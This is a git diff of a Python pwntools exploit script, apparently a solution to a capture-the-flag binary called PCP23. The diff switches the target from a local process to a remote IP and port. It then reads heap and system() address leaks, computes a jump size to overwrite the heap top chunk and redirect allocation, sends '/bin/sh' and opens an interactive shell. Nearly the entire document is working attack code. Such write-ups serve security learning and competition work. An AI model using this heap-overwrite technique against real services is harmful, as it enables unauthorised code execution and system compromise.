@@ -14,6 +14,9 @@ PCP23: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically link
 
 # Importing Libaries
 from pwn import *
+import re
+
+# File information
 filename = "./PCP23"
 elf = ELF(filename)
 context.arch = 'amd64'
@@ -24,24 +27,42 @@ minChunkSize=b"24"
 overwriteTop=b"\xff"*32
 heapLeak=b""
 sysCall=b""
+junk=b"This is a trash chunk bois"
 
 # Start process
-p = process(filename)
+# p = process(filename)
+p = remote("165.22.46.243",8969)
 
 # Set up small chunk to overwrite topchunk
-p.sendline(name)
-p.sendline(minChunkSize)
+p.sendlineafter(b"No, really.)",name)
+p.sendlineafter(b"what size?:",minChunkSize)
 
-# Store Heap Leak (Still overwriting top chunk)
+# Grabbing heap leak
 p.recvuntil(b"Your chunk m'lady: ")
 heapLeak=p.recvuntil(b"\n")
 
-# Finishing overwrite topchunk
-p.sendline(overwriteTop)
+# Finish overwriting the topchunk
+p.sendlineafter(b"What would you like to store in this fine chunk?:",overwriteTop)
+resp=p.recvrepeat(1)
 
-# Storing system leak
-p.recvuntil(b"And now for system(")
-sysCall=p.recvuntil(")\n")
+# Store Leaks
+leak=re.findall(b"(0x[0-9a-f]{6,16})",resp)
+sysCall=leak[0]
 
-print("HEAPLEAK ",heapLeak)
-print("System Leak ",sysCall)
+# Converting leaks to decimal
+heapLeakInt = int(heapLeak,16)
+sysCallInt = int(sysCall, 16)
+
+# Calculating Next Chunk and gap
+mychunk = heapLeakInt+32    # due to small size, only should be a jump from the start of over chunk to next chunk
+gap = mychunk - sysCallInt  # Figure out distance between the next malloc to overwrite this piece
+jumpsize = gap -16   # want to padd way up to target instead of right onto it
+
+# Send line of jump size then send junk then create new chunk, should alloc right onto targer
+p.sendline(str(jumpsize))
+p.sendline(junk)
+p.sendline("32")
+
+# Pop a shell by using binsh
+p.sendline(b"/bin/sh\x00")
+p.interactive()
